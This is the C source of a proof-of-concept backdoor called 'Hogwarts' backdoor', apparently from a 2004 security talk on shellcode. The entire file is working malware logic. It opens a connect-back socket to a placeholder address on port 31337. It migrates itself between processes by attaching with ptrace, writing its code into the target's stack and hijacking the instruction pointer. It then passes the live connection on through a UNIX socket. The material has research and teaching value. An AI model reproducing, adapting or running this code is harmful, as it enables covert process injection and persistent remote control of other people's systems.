/* Hogwarts' backdoor
 *
 * WARNING: Don't run this PoC if you don't know what it is.
 * See http://www.secdev.org/conf/about_shellcodes-SyScAN.pdf for more infos.
 *
 * Note: this is not well coded, yet.
 * 
 * Copyright (C) 2004  Philippe Biondi <phil@secdev.org>
 * 
 * $Id$
 */


#include <sys/user.h>
#define ERESTARTSYS     512
#define ERESTARTNOINTR  513
#define ERESTARTNOHAND  514     /* restart if no handler.. */
#define WUNTRACED       2       /* Report status of stopped children.  */

#define LOADSZ 2400

#define BACK_IP IP(127,0,0,1)
#define BACK_PORT 31337

static char gen = '?';
static char digits[] = "0123456789";
#define PLEN 15
static int pnum = 0;
static int firsttime = 1;
static int mode = 0;

static int path[PLEN] = {0,1,2,3,4,5,6,7,8,9,0,1,2,3,4};

static int main(void)
{
	int pid, old_eip,start,i, ok, s, t;
        struct user_regs_struct regs;
        struct sockaddr_in sa;
        struct sockaddr_un un;
	char buf[16];
        struct msghdr msg = {0};
        struct cmsghdr *cmsg;
	struct timeval slptime;


	__asm__("pusha");

	/*** get the socket ***/
	un.sun_family = AF_UNIX;
	for (i=4;i<108;i++) un.sun_path[i]=0;
	*(int *)un.sun_path=0x00123400;
	msg.msg_control = buf;

	if (firsttime == 1) {
		firsttime = 0;
		s = socket(PF_INET, SOCK_STREAM, 0);
		sa.sin_family = PF_INET;
		sa.sin_addr.s_addr = BACK_IP;
		sa.sin_port = htons(BACK_PORT);

		while (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0);
	}
	else {
		t = socket(PF_UNIX, SOCK_DGRAM, 0);
	
		while (bind(t, (struct sockaddr *)&un, sizeof(un)) < 0); 

                msg.msg_controllen = sizeof(buf);
		while (recvmsg(t, &msg, 0) < 0);

		cmsg = CMSG_FIRSTHDR(&msg);
		s = *(int *)CMSG_DATA(cmsg);
		close(t);
	}

	/*** do the mission ***/
	pid = getpid();
	{
		write(s, &gen, 1);
		fd_set fds;

		FD_ZERO(&fds);
		FD_SET(s, &fds);
		slptime.tv_sec  = 0;
		slptime.tv_usec = 900000;

		if (select(s+1, &fds, NULL, NULL, &slptime) > 0) {
			t = read(s, buf, 16);
			write(1,"Hi, I'm gen [",13);
			write(1,&gen,1);
			write(1,"] from pid [",12);
			write(1,&digits[(pid/10000)%10],1);
			write(1,&digits[(pid/1000)%10],1);
			write(1,&digits[(pid/100)%10],1);
			write(1,&digits[(pid/10)%10],1);
			write(1,&digits[pid%10],1);
			write(1,"]. I received [",15);
			write(1, buf, t-1);
			write(1,"]\n",2);
		}		
	}
	gen++;
	if (gen > 'Z') gen = 'A';

	/*** replicate ***/
	ok = 0;
	do {
        	if (mode == 0) {
        		pid = getppid();
			if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        			mode = 1;
        		else {
        			ok = 1;
				if (pnum < PLEN)
					path[pnum++] = getpid();
			}
        	}
        	if (mode == 1) {
			if (!pnum) {
				mode = 0;
				continue;
			}
        		pid = path[--pnum];
                	if (!ptrace(PTRACE_ATTACH, pid, NULL, NULL))
				ok = 1;
		}
	} while (!ok);

        waitpid(pid, 0, WUNTRACED);
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);	
        start = regs.esp-1024-LOADSZ;
        for (i=0; i < LOADSZ; i+=4) 
                ptrace(PTRACE_POKEDATA, pid, (void *)(start+i), (void *)*(int *)(((unsigned char *)(&main))+i) );

        /*** Change execution flow ***/
        old_eip = regs.eip;
        regs.eip = start;
        if ( (regs.orig_eax >= 0) &&
             (regs.eax == -ERESTARTNOHAND ||
              regs.eax == -ERESTARTSYS ||
              regs.eax == -ERESTARTNOINTR) ) {
                regs.eip += 2;
                old_eip -= 2;
        }

        /*** push eip ***/
        regs.esp -= 4;
        ptrace(PTRACE_POKEDATA, pid, (char *)regs.esp, (char *)old_eip);

        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

	
	t = socket(PF_UNIX, SOCK_DGRAM, 0);

	while (connect(t, (struct sockaddr *)&un, sizeof(un)) < 0);

	msg.msg_controllen = CMSG_SPACE(sizeof(s));
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(s));
	*(int *)CMSG_DATA(cmsg) = s;
	sendmsg(t, &msg, 0);
	close(t);
	close(s);

	if (gen == '@') exit(0);
	
	__asm__("popa");
}

	
	
